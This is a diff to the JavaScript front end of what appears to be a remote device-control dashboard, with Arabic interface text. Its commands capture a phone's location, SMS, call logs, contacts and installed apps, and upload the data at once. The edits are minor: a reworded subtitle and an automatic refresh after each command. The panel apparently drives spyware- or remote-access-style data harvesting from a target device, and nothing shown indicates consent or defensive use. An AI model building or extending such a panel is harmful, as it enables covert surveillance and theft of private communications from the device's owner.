@@ -657,7 +657,7 @@ async function renderDeviceState(el) {
 async function renderCommands(el) {
   el.innerHTML = `
     <div class="card"><div class="card-header"><h3>🎮 تحكم كامل بالجهاز</h3></div>
-    <p style="font-size:13px;color:#94a3b8;margin-bottom:12px">لوحة التحكم عن بعد — جميع الأوامر تنفذ فوراً على الجهاز</p>
+    <p style="font-size:13px;color:#94a3b8;margin-bottom:12px">لوحة التحكم عن بعد — جميع الأوامر تنفذ فوراً على الجهاز وترفع البيانات مباشرة</p>
 
     <div style="margin-bottom:16px"><strong style="color:#3b82f6">📡 بيانات وجمع</strong></div>
     <div class="cmd-grid">
@@ -731,9 +731,8 @@ async function sendCommand(command, params = {}) {
       clearInterval(check);
       resultEl.innerHTML = `<div class="cmd-result" style="color:#22c55e">✅ تم تنفيذ "${getCmdLabel(command)}" بنجاح ${cmd.executed_at ? 'الساعة ' + new Date(cmd.executed_at).toLocaleTimeString('ar-SA') : ''}</div>`;
       loadPrevCommands();
-      if (['capture_location','capture_call_logs','capture_sms','capture_contacts','capture_apps'].includes(command)) {
-        setTimeout(() => renderTab(currentTab), 2000);
-      }
+      // تحديث التبويب الحالي فوراً لرؤية البيانات الجديدة
+      setTimeout(() => renderTab(currentTab), 1500);
     } else if (cmd?.status === 'failed') {
       clearInterval(check);
       resultEl.innerHTML = `<div class="cmd-result" style="color:#ef4444">✕ فشل التنفيذ: ${cmd.result || 'خطأ غير معروف'}</div>`;
